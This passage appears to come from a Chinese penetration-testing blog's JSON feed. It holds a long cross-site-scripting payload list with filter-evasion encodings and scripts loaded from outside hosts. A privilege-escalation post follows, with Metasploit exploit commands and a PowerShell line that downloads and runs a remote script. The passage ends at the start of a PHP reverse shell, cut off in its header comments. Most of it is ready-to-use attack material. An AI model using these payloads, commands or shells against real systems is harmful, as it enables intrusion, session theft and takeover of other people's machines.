src=\"javascript:alert('XSS')\"\n\n&lt;!--#exec cmd=\"/bin/echo '&lt;SCRIPT SRC'\"-->&lt;!--#exec cmd=\"/bin/echo\n'=http://xss.ha.ckers.org/a.js></span><span><span><span>&lt;/</span><span>SCRIPT</span></span><span>></span></span><span>'\"-->\n\n</span><span><span><span>&lt;</span><span>IMG</span></span> <span>src</span><span><span>=</span><span>\"</span>http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode<span>\"</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>SCRIPT</span></span> <span>a</span><span><span>=</span><span>\"</span>><span>\"</span></span> <span>src</span><span><span>=</span><span>\"</span>http://xss.ha.ckers.org/a.js<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span><span>SCRIPT</span></span><span>></span></span><span>\n\n&lt;SCRIPT =\">\" src=\"http://xss.ha.ckers.org/a.js\"></span><span><span><span>&lt;/</span><span>SCRIPT</span></span><span>></span></span><span>\n\n&lt;SCRIPT a=\">\" '' src=\"http://xss.ha.ckers.org/a.js\"></span><span><span><span>&lt;/</span><span>SCRIPT</span></span><span>></span></span><span>\n\n&lt;SCRIPT \"a='>'\" src=\"http://xss.ha.ckers.org/a.js\"></span><span><span><span>&lt;/</span><span>SCRIPT</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>SCRIPT</span></span><span>></span></span><span>document.write(\"&lt;SCRI\");</span><span><span><span>&lt;/</span><span>SCRIPT</span></span><span>></span></span><span>PT src=\"http://xss.ha.ckers.org/a.js\"></span><span><span><span>&lt;/</span><span>SCRIPT</span></span><span>></span></span><span>\n\n&lt;A href=http://www.gohttp://www.google.com/ogle.com/>link</span><span><span><span>&lt;/</span><span>A</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>IMG</span></span> <span>SRC</span><span><span>=</span>javascript:alert(‘XSS’)</span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>IMG</span></span> <span>SRC</span><span><span>=</span>#</span> <span><span>onmouseover</span><span><span>=</span><span><span>”alert</span><span>(</span>‘xxs’<span>)</span>”</span></span></span><span>></span></span><span>\n\n&lt;IMG SRC=/ onerror=”alert(String.fromCharCode(88,83,83))”></span><span><span><span>&lt;/</span>img</span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span>img</span> <span>src</span><span><span>=</span>x</span> <span><span>onerror</span><span><span>=</span><span>”<span>&amp;</span>#<span>0000106</span><span>&amp;</span>#<span>0000097</span><span>&amp;</span>#<span>0000118</span><span>&amp;</span>#<span>0000097</span><span>&amp;</span>#<span>0000115</span><span>&amp;</span>#<span>0000099</span><span>&amp;</span>#<span>0000114</span><span>&amp;</span>#<span>0000105</span><span>&amp;</span>#<span>0000112</span><span>&amp;</span>#<span>0000116</span><span>&amp;</span>#<span>0000058</span><span>&amp;</span>#<span>0000097</span><span>&amp;</span>#<span>0000108</span><span>&amp;</span>#<span>0000101</span><span>&amp;</span>#<span>0000114</span><span>&amp;</span>#<span>0000116</span><span>&amp;</span>#<span>0000040</span><span>&amp;</span>#<span>0000039</span><span>&amp;</span>#<span>0000088</span><span>&amp;</span>#<span>0000083</span><span>&amp;</span>#<span>0000083</span><span>&amp;</span>#<span>0000039</span><span>&amp;</span>#<span>0000041</span>″</span></span></span><span>></span></span><span>\n\n&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;\n\n&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;>\n\n</span><span><span><span>&lt;</span><span>IMG</span></span> <span>SRC</span><span><span>=</span>&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29</span><span>></span></span><span>\n\n&lt;IMG SRC=”jav ascript:alert(‘XSS’);”>\n\n</span><span><span><span>&lt;</span><span>IMG</span></span> <span>SRC</span><span><span>=</span>”jav<span title=\"&#x0A;\">&amp;#x0A;</span>ascript:alert(‘XSS’);”</span><span>></span></span><span>\n\n&lt;IMG SRC=” &amp;#14;  javascript:alert(‘XSS’);”>\n\n&lt;</span><span><span><span>&lt;</span><span>SCRIPT</span></span><span>></span></span><span>alert(“XSS”);//&lt;</span><span><span><span>&lt;/</span><span>SCRIPT</span></span><span>></span></span><span>\n\n&lt;IMG SRC=”javascript:alert(‘XSS’)”\n\n</span><span><span><span>&lt;/</span>script</span><span>></span></span><span><span><span>&lt;</span>script</span><span>></span></span><span>alert(‘XSS’);</span><span><span><span>&lt;/</span>script</span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>INPUT</span></span> <span>TYPE</span><span><span>=</span>”IMAGE”</span> <span>SRC</span><span><span>=</span>”javascript:alert(‘XSS’);”</span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>BODY</span></span> <span>BACKGROUND</span><span><span>=</span>”javascript:alert(‘XSS’)”</span><span>></span></span><span>\n\n&lt;svg/onload=alert('XSS')>\n\n</span><span><span><span>&lt;</span><span>IMG</span></span> <span>SRC</span><span><span>=</span>’vbscript:msgbox(“XSS”)’</span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>BGSOUND</span></span> <span>SRC</span><span><span>=</span><span>\"</span>javascript:alert(<span>'</span>XSS<span>'</span>);<span>\"</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>BR</span></span> <span>SIZE</span><span><span>=</span><span>\"</span>&amp;{alert(<span>'</span>XSS<span>'</span>)}<span>\"</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>LINK</span></span> <span>REL</span><span><span>=</span><span>\"</span>stylesheet<span>\"</span></span> <span>HREF</span><span><span>=</span><span>\"</span>javascript:alert(<span>'</span>XSS<span>'</span>);<span>\"</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>STYLE</span></span><span>></span></span><span>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</span><span><span><span>&lt;/</span><span>STYLE</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>IMG</span></span> <span><span>STYLE</span><span><span>=</span><span>\"</span><span><span>xss</span><span>:</span>expr<span>/*XSS*/</span><span>ession</span><span>(</span><span>alert</span><span>(</span><span>'XSS'</span><span>)</span><span>)</span></span><span>\"</span></span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>STYLE</span></span><span>></span></span><span>.XSS{background-image:url(\"javascript:alert('XSS')\");}</span><span><span><span>&lt;/</span><span>STYLE</span></span><span>></span></span><span><span><span>&lt;</span><span>A</span></span> <span>CLASS</span><span><span>=</span>XSS</span><span>></span></span><span><span><span>&lt;/</span><span>A</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>STYLE</span></span> <span>type</span><span><span>=</span><span>\"</span>text/css<span>\"</span></span><span>></span></span><span>BODY{background:url(\"javascript:alert('XSS')\")}</span><span><span><span>&lt;/</span><span>STYLE</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>XSS</span></span> <span><span>STYLE</span><span><span>=</span><span>\"</span><span><span>behavior</span><span>:</span> <span><span>url</span><span>(</span>xss.htc<span>)</span></span><span>;</span></span><span>\"</span></span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>IFRAME</span></span> <span>SRC</span><span><span>=</span><span>\"</span>javascript:alert(<span>'</span>XSS<span>'</span>);<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span><span>IFRAME</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>FRAMESET</span></span><span>></span></span><span><span><span>&lt;</span><span>FRAME</span></span> <span>SRC</span><span><span>=</span><span>\"</span>javascript:alert(<span>'</span>XSS<span>'</span>);<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span><span>FRAMESET</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>TABLE</span></span><span>></span></span><span><span><span>&lt;</span><span>TD</span></span> <span>BACKGROUND</span><span><span>=</span><span>\"</span>javascript:alert(<span>'</span>XSS<span>'</span>)<span>\"</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>DIV</span></span> <span><span>STYLE</span><span><span>=</span><span>\"</span><span><span>width</span><span>:</span> <span>expression</span><span>(</span><span>alert</span><span>(</span><span>'XSS'</span><span>)</span><span>)</span><span>;</span></span><span>\"</span></span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>SCRIPT</span></span> <span>a</span><span><span>=</span><span>\"</span>><span>\"</span></span> <span>SRC</span><span><span>=</span><span>\"</span>httx://xss.rocks/xss.js<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span><span>SCRIPT</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span>script</span><span>></span></span><span>alert(/xss/)</span><span><span><span>&lt;/</span>script</span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span>svg</span> <span><span>onload</span><span><span>=</span><span><span>alert</span><span>(</span>document<span>.</span>domain<span>)</span></span></span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span>img</span> <span>src</span><span><span>=</span>document.domain</span> <span><span>onerror</span><span><span>=</span><span><span>alert</span><span>(</span>document<span>.</span>domain<span>)</span></span></span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>M</span></span> <span><span>onmouseover</span><span><span>=</span><span><span>alert</span><span>(</span>document<span>.</span>domain<span>)</span></span></span></span><span>></span></span><span>M\n\n</span><span><span><span>&lt;</span>marquee</span> <span><span>onscroll</span><span><span>=</span><span><span>alert</span><span>(</span>document<span>.</span>domain<span>)</span></span></span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span>a</span> <span>href</span><span><span>=</span>javascript:alert(document.domain)</span><span>></span></span><span>M</span><span><span><span>&lt;/</span>a</span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span>body</span> <span><span>onload</span><span><span>=</span><span><span>alert</span><span>(</span>document<span>.</span>domain<span>)</span></span></span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span>details</span> <span>open</span> <span>ontoggle</span><span><span>=</span>alert(document.domain)</span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span>embed</span> <span>src</span><span><span>=</span>javascript:alert(document.domain)</span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span>script</span><span>></span></span><span>alert(1)</span><span><span><span>&lt;/</span>script</span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span>sCrIpT</span><span>></span></span><span>alert(1)</span><span><span><span>&lt;/</span>sCrIpT</span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>ScRiPt</span></span><span>></span></span><span>alert(1)</span><span><span><span>&lt;/</span><span>ScRiPt</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span>sCrIpT</span><span>></span></span><span>alert(1)</span><span><span><span>&lt;/</span><span>ScRiPt</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>ScRiPt</span></span><span>></span></span><span>alert(1)</span><span><span><span>&lt;/</span>sCrIpT</span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span>img</span> <span>src</span><span><span>=</span>1</span> <span><span>onerror</span><span><span>=</span><span><span>alert</span><span>(</span><span>1</span><span>)</span></span></span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span>iMg</span> <span>src</span><span><span>=</span>1</span> <span><span>oNeRrOr</span><span><span>=</span><span><span>alert</span><span>(</span><span>1</span><span>)</span></span></span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>ImG</span></span> <span>src</span><span><span>=</span>1</span> <span><span>OnErRoR</span><span><span>=</span><span><span>alert</span><span>(</span><span>1</span><span>)</span></span></span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span>img</span> <span>src</span><span><span>=</span>1</span> <span><span>onerror</span><span><span>=</span><span>\"</span><span><span>alert</span><span>(</span><span>&amp;</span>quot<span>;</span><span>M</span><span>&amp;</span>quot<span>;</span><span>)</span></span><span>\"</span></span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span>marquee</span> <span><span>onscroll</span><span><span>=</span><span><span>alert</span><span>(</span><span>1</span><span>)</span></span></span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span>mArQuEe</span> <span><span>OnScRoLl</span><span><span>=</span><span><span>alert</span><span>(</span><span>1</span><span>)</span></span></span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>MaRqUeE</span></span> <span><span>oNsCrOlL</span><span><span>=</span><span><span>alert</span><span>(</span><span>1</span><span>)</span></span></span></span><span>></span></span><span>\n\n&lt;a href=javascript:/0/,alert(%22M%22)>M</span><span><span><span>&lt;/</span>a</span><span>></span></span><span>\n\n&lt;a href=javascript:/00/,alert(%22M%22)>M</span><span><span><span>&lt;/</span>a</span><span>></span></span><span>\n\n&lt;a href=javascript:/000/,alert(%22M%22)>M</span><span><span><span>&lt;/</span>a</span><span>></span></span><span>\n\n&lt;a href=javascript:/M/,alert(%22M%22)>M</span><span><span><span>&lt;/</span>a</span><span>></span></span><span>\n\n&lt;base href=javascript:/M/></span><span><span><span>&lt;</span>a</span> <span>href</span><span><span>=</span>,alert(1)</span><span>></span></span><span>M</span><span><span><span>&lt;/</span>a</span><span>></span></span><span>\n\n&lt;base href=javascript:/M/></span><span><span><span>&lt;</span>iframe</span> <span>src</span><span><span>=</span>,alert(1)</span><span>></span></span><span><span><span>&lt;/</span>iframe</span><span>></span></span><span>\n\n</span><span><span><span>&lt;/</span>textarea</span><span>></span></span><span><span><span>&lt;</span>script</span><span>></span></span><span>var a=1//@ sourceMappingURL=//xss.site</span><span><span><span>&lt;/</span>script</span><span>></span></span><span>\n\n\"></span><span><span><span>&lt;</span>img</span> <span>src</span><span><span>=</span>x</span> <span><span>onerror</span><span><span>=</span><span><span>alert</span><span>(</span>document<span>.</span>cookie<span>)</span></span></span></span><span>></span></span><span>.gif\n\n</span><span><span><span>&lt;</span>div</span> <span><span>style</span><span><span>=</span><span>\"</span><span><span>background-image</span><span>:</span><span>url</span><span>(</span><span>javascript</span><span>:</span><span>alert</span><span>(</span>/xss/<span>)</span><span>)</span></span><span>\"</span></span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>STYLE</span></span><span>></span></span><span>@import'http://ha.ckers.org/xss.css';</span><span><span><span>&lt;/</span><span>STYLE</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span>iframe</span> <span>src</span><span><span>=</span>javascript:alert(1)</span><span>></span></span><span><span><span>&lt;/</span>iframe</span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span>iframe</span> <span>src</span><span><span>=</span><span>\"</span>data:text/html,&lt;iframe src=javascript:alert(<span>'</span>M<span>'</span>)>&lt;/iframe><span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>iframe</span><span>></span></span><span>\n\n&lt;iframe src=data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgiTWFubml4Iik+PC9pZnJhbWU+></span><span><span><span>&lt;/</span>iframe</span><span>></span></span><span>\n\n&lt;iframe srcdoc=&lt;svg/o&amp;#x6E;load&amp;equals;alert&amp;lpar;1)&amp;gt;></span><span><span><span>&lt;/</span>iframe</span><span>></span></span><span>\n\n&lt;iframe src=https://baidu.com width=1366 height=768></span><span><span><span>&lt;/</span>iframe</span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span>iframe</span> <span>src</span><span><span>=</span>javascript:alert(1)</span> <span>width</span><span><span>=</span>1366</span> <span>height</span><span><span>=</span>768</span><span>></span></span><span>&lt;/iframe\n\n</span><span><span><span>&lt;</span>form</span> <span>action</span><span><span>=</span>javascript:alert(1)</span><span>></span></span><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span>submit</span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span>form</span><span>></span></span><span><span><span>&lt;</span>button</span> <span>formaction</span><span><span>=</span>javascript:alert(1)</span><span>></span></span><span>M\n\n</span><span><span><span>&lt;</span>form</span><span>></span></span><span><span><span>&lt;</span>input</span> <span>formaction</span><span><span>=</span>javascript:alert(1)</span> <span>type</span><span><span>=</span>submit</span> <span>value</span><span><span>=</span>M</span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span>form</span><span>></span></span><span><span><span>&lt;</span>input</span> <span>formaction</span><span><span>=</span>javascript:alert(1)</span> <span>type</span><span><span>=</span>image</span> <span>value</span><span><span>=</span>M</span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span>form</span><span>></span></span><span><span><span>&lt;</span>input</span> <span>formaction</span><span><span>=</span>javascript:alert(1)</span> <span>type</span><span><span>=</span>image</span> <span>src</span><span><span>=</span>1</span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>META</span></span> <span>HTTP-EQUIV</span><span><span>=</span><span>\"</span>Link<span>\"</span></span> <span>Content</span><span><span>=</span><span>\"</span>&lt;http://ha.ckers.org/xss.css>; REL=stylesheet<span>\"</span></span><span>></span></span><span>\n</span></code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br><span>98</span><br><span>99</span><br><span>100</span><br><span>101</span><br><span>102</span><br><span>103</span><br><span>104</span><br><span>105</span><br><span>106</span><br><span>107</span><br><span>108</span><br><span>109</span><br><span>110</span><br><span>111</span><br><span>112</span><br><span>113</span><br><span>114</span><br><span>115</span><br><span>116</span><br><span>117</span><br><span>118</span><br><span>119</span><br><span>120</span><br><span>121</span><br><span>122</span><br><span>123</span><br><span>124</span><br><span>125</span><br><span>126</span><br><span>127</span><br><span>128</span><br><span>129</span><br><span>130</span><br><span>131</span><br><span>132</span><br><span>133</span><br><span>134</span><br><span>135</span><br><span>136</span><br><span>137</span><br><span>138</span><br><span>139</span><br><span>140</span><br><span>141</span><br><span>142</span><br><span>143</span><br><span>144</span><br><span>145</span><br><span>146</span><br><span>147</span><br><span>148</span><br><span>149</span><br><span>150</span><br><span>151</span><br><span>152</span><br><span>153</span><br><span>154</span><br><span>155</span><br><span>156</span><br><span>157</span><br><span>158</span><br><span>159</span><br><span>160</span><br><span>161</span><br><span>162</span><br><span>163</span><br><span>164</span><br><span>165</span><br><span>166</span><br><span>167</span><br><span>168</span><br><span>169</span><br><span>170</span><br><span>171</span><br><span>172</span><br><span>173</span><br><span>174</span><br><span>175</span><br><span>176</span><br><span>177</span><br><span>178</span><br><span>179</span><br><span>180</span><br><span>181</span><br><span>182</span><br><span>183</span><br><span>184</span><br><span>185</span><br><span>186</span><br><span>187</span><br><span>188</span><br><span>189</span><br><span>190</span><br><span>191</span><br><span>192</span><br><span>193</span><br><span>194</span><br><span>195</span><br><span>196</span><br><span>197</span><br><span>198</span><br><span>199</span><br><span>200</span><br><span>201</span><br><span>202</span><br><span>203</span><br><span>204</span><br><span>205</span><br><span>206</span><br><span>207</span><br><span>208</span><br><span>209</span><br><span>210</span><br><span>211</span><br><span>212</span><br><span>213</span><br><span>214</span><br><span>215</span><br><span>216</span><br><span>217</span><br><span>218</span><br><span>219</span><br><span>220</span><br><span>221</span><br><span>222</span><br><span>223</span><br><span>224</span><br><span>225</span><br><span>226</span><br><span>227</span><br><span>228</span><br><span>229</span><br><span>230</span><br><span>231</span><br><span>232</span><br><span>233</span><br><span>234</span><br><span>235</span><br><span>236</span><br><span>237</span><br><span>238</span><br><span>239</span><br><span>240</span><br><span>241</span><br><span>242</span><br><span>243</span><br><span>244</span><br><span>245</span><br><span>246</span><br><span>247</span><br><span>248</span><br><span>249</span><br><span>250</span><br><span>251</span><br><span>252</span><br><span>253</span><br><span>254</span><br><span>255</span><br><span>256</span><br><span>257</span><br><span>258</span><br><span>259</span><br><span>260</span><br><span>261</span><br><span>262</span><br><span>263</span><br><span>264</span><br><span>265</span><br><span>266</span><br><span>267</span><br><span>268</span><br><span>269</span><br><span>270</span><br><span>271</span><br><span>272</span><br><span>273</span><br><span>274</span><br><span>275</span><br><span>276</span><br><span>277</span><br><span>278</span><br><span>279</span><br><span>280</span><br><span>281</span><br><span>282</span><br><span>283</span><br><span>284</span><br><span>285</span><br><span>286</span><br><span>287</span><br><span>288</span><br><span>289</span><br><span>290</span><br><span>291</span><br><span>292</span><br><span>293</span><br><span>294</span><br><span>295</span><br><span>296</span><br><span>297</span><br><span>298</span><br></div></div>",
      "date_published": "2021-08-18T00:00:00.000Z",
      "date_modified": "2022-04-20T06:36:02.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "渗透"
      ]
    },
    {
      "title": "常用的提权扫描辅助工具总结",
      "url": "http://www.liuhanzhe.com/docs/security/%E6%B8%97%E9%80%8F/8.WindowsLinux%E4%B8%8B%E5%B8%B8%E7%94%A8%E7%9A%84%E6%8F%90%E6%9D%83%E6%89%AB%E6%8F%8F%E8%BE%85%E5%8A%A9%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/",
      "id": "http://www.liuhanzhe.com/docs/security/%E6%B8%97%E9%80%8F/8.WindowsLinux%E4%B8%8B%E5%B8%B8%E7%94%A8%E7%9A%84%E6%8F%90%E6%9D%83%E6%89%AB%E6%8F%8F%E8%BE%85%E5%8A%A9%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/",
      "content_html": "<h3 id=\"使用windows-exploit-suggester解析systeminfo\"> 使用Windows-Exploit-Suggester解析systeminfo</h3>\n<p>下载地址：https://github.com/AonCyberLabs/Windows-Exploit-Suggester</p>\n<div><pre><code>./windows-exploit-suggester.py\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"使用linux-exploit-suggester-sh寻找linux提权问题\"> 使用Linux-Exploit-Suggester.sh寻找linux提权问题</h3>\n<p>下载地址：https://github.com/mzet-/linux-exploit-suggester</p>\n<div><pre><code>./linux-exploit-suggester.sh\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"使用sherlock工具\"> 使用Sherlock工具</h3>\n<p>下载地址：https://github.com/rasta-mouse/Sherlock</p>\n<div><pre><code>Import-Module Sherlock.ps1\nFind-AllVulns\n</code></pre>\n<div><span>1</span><br><span>2</span><br></div></div><h3 id=\"使用msf查询补丁和可利用提权漏洞\"> 使用MSF查询补丁和可利用提权漏洞</h3>\n<div><pre><code>#查询补丁\n\nmeterpreter&gt; run post/windows/gather/enum_patches \n[+] KB2999226 installed on 11/25/2020\n[+] KB976902 installed on 11/21/2010\n\n#查询Exp\n\nmsf&gt; use post/multi/recon/local_exploit_suggester \nmsf&gt; set LHOST &lt;攻击机IP&gt;\nmsf&gt; set SESSION &lt;session_id&gt;\nmsf&gt; run\n\n# 利用示例\n\nmsf&gt; use exploit/windows/local/cve_2019_1458_wizardopium \nmsf&gt; set SESSION &lt;session_id&gt;\nmsf&gt; run\nmeterpreter&gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br></div></div><h3 id=\"使用powerup检查提权漏洞\"> 使用powerup检查提权漏洞</h3>\n<div><pre><code>powershell.exe -exec bypass -Command &quot;&amp; {Import-Module .\\PowerUp.ps1; Invoke-AllChecks}&quot;\npowershell.exe -nop -exec bypass -c &quot;IEX (New-object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1&#39;);Invoke-AllChecks&quot;\n</code></pre>\n<div><span>1</span><br><span>2</span><br></div></div><h3 id=\"使用accesschk-exe对系统扫描发现高权限可执行程序-且能够被低权限用户更改\"> 使用accesschk.exe对系统扫描发现高权限可执行程序，且能够被低权限用户更改</h3>\n<div><pre><code>accesschk &quot;d:\\dir&quot;\n查看所有用户在d盘dir路径的子路径的权限\n\naccesschk &quot;Administrator &quot;d:\\dir&quot;\n查看Administrator用户在d盘dir路径的子路径的权限\n\naccesschk Administrators -c *\n查看Administrators组对所有服务的权限\n\naccesschk -k Guest hklm\\software\n查看Guest用户对hklm\\software注册表的权限\n\naccesschk -ou User\n查看User用户对全局对象的权限\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div><h3 id=\"查找主机上具有的cve-查找具有公开exp的cve的python脚本\"> 查找主机上具有的CVE，查找具有公开EXP的CVE的Python脚本</h3>\n<p>下载地址：https://github.com/chroblert/WindowsVulnScan</p>\n<div><pre><code>.\\KBCollect.ps1\npython3 -m pip install requirements.txt\ncve-check.py -u\n\n查看具有公开EXP的CVE\ncve-check.py -C -f KB.json\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><h3 id=\"在线提权漏洞检测平台\"> 在线提权漏洞检测平台</h3>\n<p>极光无限出品的安全扫描仪，在提权方面，基于其强大的安全检测能力，能够给出专业的修复建议，有效验证和加固网络资产漏洞。</p>\n<p>查询地址：https://detect.secwx.com/</p>\n<h3 id=\"提权辅助网页\"> 提权辅助网页</h3>\n<p>在Windows提权的时候，对比补丁找Exp很烦吧？这个网站数据源每周更新一次，值得推荐</p>\n<p>查询地址：http://bugs.hacking8.com/tiquan/</p>\n",
      "date_published": "2021-08-18T00:00:00.000Z",
      "date_modified": "2022-04-20T06:36:02.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "渗透"
      ]
    },
    {
      "title": "反弹shell",
      "url": "http://www.liuhanzhe.com/docs/security/%E6%B8%97%E9%80%8F/9.%E5%8F%8D%E5%BC%B9shell/",
      "id": "http://www.liuhanzhe.com/docs/security/%E6%B8%97%E9%80%8F/9.%E5%8F%8D%E5%BC%B9shell/",
      "content_html": "<h2 id=\"php\"> php</h2>\n<div><pre><code><span><span>&lt;?php</span>\n<span>// php-reverse-shell - A Reverse Shell implementation in PHP</span>\n<span>// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span>\n<span>//</span>\n<span>// This tool may be used for legal purposes only.  Users take full responsibility</span>\n<span>// for any actions performed using this tool.  The author accepts no liability</span>\n<span>// for damage caused by this tool.  If these terms are not acceptable to you, then</span>\n<span>// do not use this tool.</span>\n<span>//</span>\n<span>// In all other respects the GPL version 2 applies:</span>\n<span>//</span>\n<span>// This program is free software; you can redistribute it and/or modify</span>\n<span>// it under the terms of the GNU General Public License version 2 as</span>\n<span>// published by the Free Software Foundation.</span>\n<span>//</span>\n<span>// This program is distributed in the hope that it will be useful,</span>\n<span>// but WITHOUT ANY WARRANTY; without even the implied warranty of</span>\n<span>// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span>\n<span>// GNU General Public License for more details.</span>\n<span>//</span>\n<span>// You should have received a copy of the GNU General Public License along</span>\n<span>// with this program; if not, write to the Free Software Foundation, Inc.,</span>\n<span>// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span>\n<span>//</span>\n<span>// This tool may be used for legal purposes only.  Users take full responsibility</span>\n<span>// for any actions performed using this tool.  If these terms are not acceptable to</span>\n<span>// you, then do not use this tool.</span>\n<span>//</span>\n<span>// You are encouraged to send comments, improvements or suggestions to</span>\n<span>// me at pentestmonkey@pentestmonkey.net</span>\n<span>//</span>\n<span>// Description</span>\n<span>// -----------</span>\n<span>// This script will make an outbound TCP connection to a hardcoded IP and port.</span>\n<span>// The recipient will be given a shell running as the current user (apache normally).</span>\n<span>//</span>\n<span>// Limitations</span>\n<span>// -----------</span>\n<span>// proc_open and stream_set_blocking require PHP version 4.3+, or 5+</span>\n<span>// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.</span>\n<span>// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely 